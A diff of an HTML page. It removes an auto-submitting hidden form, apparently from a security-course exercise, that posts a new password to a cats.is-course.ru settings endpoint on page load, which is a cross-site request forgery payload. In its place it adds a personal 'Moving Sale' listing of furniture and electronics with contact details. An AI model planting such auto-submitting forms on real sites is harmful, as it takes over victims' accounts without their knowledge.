@@ -1,12 +1,385 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Moving Sale | Vlad</title>
+    <style>
+      :root {
+        color-scheme: light dark;
+        --bg: #f5f5f7;
+        --card: #ffffff;
+        --border: #e2e2e9;
+        --text: #242424;
+        --muted: #5a5a67;
+        --accent: #365ad4;
+        --shadow: 0 10px 30px rgba(24, 31, 45, 0.1);
+      }
+
+      @media (prefers-color-scheme: dark) {
+        :root {
+          --bg: #11131a;
+          --card: #1b1f2d;
+          --border: #2a3042;
+          --text: #f5f6fb;
+          --muted: #a0a5bd;
+          --shadow: 0 14px 30px rgba(0, 0, 0, 0.35);
+        }
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        background: linear-gradient(180deg, var(--bg) 0%, #fff 100%);
+        color: var(--text);
+      }
+
+      .container {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding: 3rem 1.5rem 4rem;
+      }
+
+      header {
+        text-align: center;
+        margin-bottom: 3rem;
+      }
+
+      header h1 {
+        font-size: clamp(2rem, 4vw, 2.8rem);
+        margin: 0;
+        letter-spacing: -0.02em;
+      }
+
+      header p {
+        font-size: 1rem;
+        color: var(--muted);
+        max-width: 640px;
+        margin: 1rem auto 0;
+        line-height: 1.6;
+      }
+
+      .items-grid {
+        display: grid;
+        gap: 2rem;
+        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      }
+
+      .item-card {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 18px;
+        overflow: hidden;
+        box-shadow: var(--shadow);
+        display: flex;
+        flex-direction: column;
+        min-height: 100%;
+      }
+
+      .item-media {
+        position: relative;
+        width: 100%;
+        overflow: hidden;
+        background: #0f111a;
+      }
+
+      .item-media img {
+        display: block;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+      }
+
+      .gallery {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+      }
+
+      .item-body {
+        padding: 1.5rem;
+        display: flex;
+        flex-direction: column;
+        gap: 0.75rem;
+        flex: 1;
+      }
+
+      .item-title {
+        margin: 0;
+        line-height: 1.3;
+        font-size: 1.25rem;
+      }
+
+      .price {
+        font-size: 1.1rem;
+        font-weight: 600;
+        color: var(--accent);
+      }
+
+      .item-meta {
+        color: var(--muted);
+        font-size: 0.95rem;
+        line-height: 1.5;
+      }
+
+      .item-actions {
+        margin-top: auto;
+      }
+
+      .item-actions a {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.35rem;
+        padding: 0.55rem 0.9rem;
+        background: var(--accent);
+        color: #ffffff;
+        border-radius: 999px;
+        font-size: 0.95rem;
+        text-decoration: none;
+        transition: transform 0.2s ease, box-shadow 0.2s ease;
+        box-shadow: 0 10px 18px rgba(54, 90, 212, 0.22);
+      }
+
+      .item-actions a:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 24px rgba(54, 90, 212, 0.3);
+      }
+
+      footer {
+        margin-top: 3rem;
+        color: var(--muted);
+        font-size: 0.95rem;
+        text-align: center;
+      }
+
+      footer a {
+        color: inherit;
+      }
+    </style>
+  </head>
   <body>
-    <form action="https://cats.is-course.ru/settings" method="POST">
-      <input type="hidden" name="password" value="CatsRuleWorld1!" />
-      <input type="hidden" name="confirm-password" value="CatsRuleWorld1!" />
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
+    <div class="container">
+      <header>
+        <h1>Moving Sale — Everything Must Go!</h1>
+        <p>
+          I’m leaving the apartment soon and posting the items I’m selling all in
+          one place. Each listing includes the price, a short description, and a
+          link to the original store page for reference. Reach out if something
+          catches your eye and you’d like more details or to arrange pickup.
+        </p>
+      </header>
+
+      <section class="items-grid">
+        <article class="item-card">
+          <figure class="item-media">
+            <img
+              src="images/monitor.jpg"
+              alt="Dell UltraSharp 27 inch monitor on a desk"
+              loading="lazy"
+            />
+          </figure>
+          <div class="item-body">
+            <h2 class="item-title">Dell UltraSharp 27&quot; Monitor (U2722D)</h2>
+            <div class="price">$250</div>
+            <p class="item-meta">
+              27-inch QHD panel with fantastic color accuracy. Used for light
+              design work and comes with the original USB-C cable and stand.
+              Zero dead pixels and factory firmware up to date.
+            </p>
+            <div class="item-actions">
+              <a
+                href="https://www.dell.com/en-us/shop/dell-ultrasharp-27-monitor-u2722d/apd/210-ayuc/monitors-monitor-accessories"
+                target="_blank"
+                rel="noopener"
+              >
+                Original store listing
+              </a>
+            </div>
+          </div>
+        </article>
+
+        <article class="item-card">
+          <figure class="item-media">
+            <img
+              src="images/chair.jpg"
+              alt="Gray ergonomic office chair"
+              loading="lazy"
+            />
+          </figure>
+          <div class="item-body">
+            <h2 class="item-title">Ergonomic Office Chair</h2>
+            <div class="price">$90</div>
+            <p class="item-meta">
+              Adjustable headrest, lumbar support, and breathable mesh back.
+              Perfect condition with smooth rolling casters. Selling because I’m
+              downsizing and won’t have a home office.
+            </p>
+            <div class="item-actions">
+              <a
+                href="https://www.ikea.com/us/en/p/markus-office-chair-vissle-dark-gray-90289172/"
+                target="_blank"
+                rel="noopener"
+              >
+                Original store listing
+              </a>
+            </div>
+          </div>
+        </article>
+
+        <article class="item-card">
+          <figure class="item-media">
+            <img
+              src="images/coffee_maker.jpg"
+              alt="Breville espresso machine sitting on a kitchen counter"
+              loading="lazy"
+            />
+          </figure>
+          <div class="item-body">
+            <h2 class="item-title">Breville Barista Pro Coffee Maker</h2>
+            <div class="price">$440</div>
+            <p class="item-meta">
+              Stainless steel espresso machine with built-in grinder. Regularly
+              descaled and cleaned, includes original accessories plus a knock
+              box. Makes a fantastic flat white in under a minute.
+            </p>
+            <div class="item-actions">
+              <a
+                href="https://www.breville.com/us/en/products/espresso/bes878.html"
+                target="_blank"
+                rel="noopener"
+              >
+                Original store listing
+              </a>
+            </div>
+          </div>
+        </article>
+
+        <article class="item-card">
+          <figure class="item-media">
+            <img
+              src="images/lamp.jpg"
+              alt="Minimalist white floor lamp with warm light"
+              loading="lazy"
+            />
+          </figure>
+          <div class="item-body">
+            <h2 class="item-title">IKEA FADO Floor Lamp</h2>
+            <div class="price">$35</div>
+            <p class="item-meta">
+              Soft diffused light with adjustable brightness. Includes three
+              smart bulbs that can be paired with Philips Hue. Excellent for
+              living rooms and reading corners.
+            </p>
+            <div class="item-actions">
+              <a
+                href="https://www.ikea.com/us/en/p/fado-floor-lamp-white-70323895/"
+                target="_blank"
+                rel="noopener"
+              >
+                Original store listing
+              </a>
+            </div>
+          </div>
+        </article>
+
+        <article class="item-card">
+          <figure class="item-media">
+            <img
+              src="images/books.jpg"
+              alt="Stack of programming and design books"
+              loading="lazy"
+            />
+          </figure>
+          <div class="item-body">
+            <h2 class="item-title">Programming &amp; Design Books Bundle</h2>
+            <div class="price">$45</div>
+            <p class="item-meta">
+              Bundle of 6 like-new titles covering Python, algorithms, UX, and
+              product design. Minimal highlighting, all pages intact. Prefer to
+              sell as a set.
+            </p>
+            <div class="item-actions">
+              <a
+                href="https://www.amazon.com/s?k=programming+book+bundle"
+                target="_blank"
+                rel="noopener"
+              >
+                Similar listings on Amazon
+              </a>
+            </div>
+          </div>
+        </article>
+
+        <article class="item-card">
+          <figure class="item-media">
+            <img
+              src="images/handle.jpg"
+              alt="Black smart door handle with keypad"
+              loading="lazy"
+            />
+          </figure>
+          <div class="item-body">
+            <h2 class="item-title">Level Touch Smart Door Handle</h2>
+            <div class="price">$150</div>
+            <p class="item-meta">
+              Sleek smart lock with Bluetooth, NFC, and auto-unlock. Fits
+              standard European and US doors. Selling with original box, spare
+              keys, and mounting hardware.
+            </p>
+            <div class="item-actions">
+              <a
+                href="https://level.co/products/touch"
+                target="_blank"
+                rel="noopener"
+              >
+                Original store listing
+              </a>
+            </div>
+          </div>
+        </article>
+
+        <article class="item-card">
+          <figure class="item-media gallery">
+            <img
+              src="images/wardbrobe_closed.jpg"
+              alt="Wardrobe exterior with closed doors"
+              loading="lazy"
+            />
+            <img
+              src="images/wardbrobe_open.jpg"
+              alt="Wardrobe interior with open doors"
+              loading="lazy"
+            />
+          </figure>
+          <div class="item-body">
+            <h2 class="item-title">PAX Wardrobe with Mirror Doors</h2>
+            <div class="price">$180</div>
+            <p class="item-meta">
+              200x236 cm wardrobe with configurable shelves, hanger, and soft
+              close doors. Includes both mirrored and interior views (see images
+              above). Must be disassembled for pickup—happy to help.
+            </p>
+            <div class="item-actions">
+              <a
+                href="https://www.ikea.com/us/en/p/pax-wardrobe-white-mehamn-mirror-glass-50214560/"
+                target="_blank"
+                rel="noopener"
+              >
+                Original store listing
+              </a>
+            </div>
+          </div>
+        </article>
+      </section>
+
+      <footer>
+        Interested? Message me on Telegram <strong>@vladpyzh</strong> or email
+        <a href="mailto:vlad.pyzh@gmail.com">vlad.pyzh@gmail.com</a> to arrange a
+        pickup.
+      </footer>
+    </div>
   </body>
 </html>
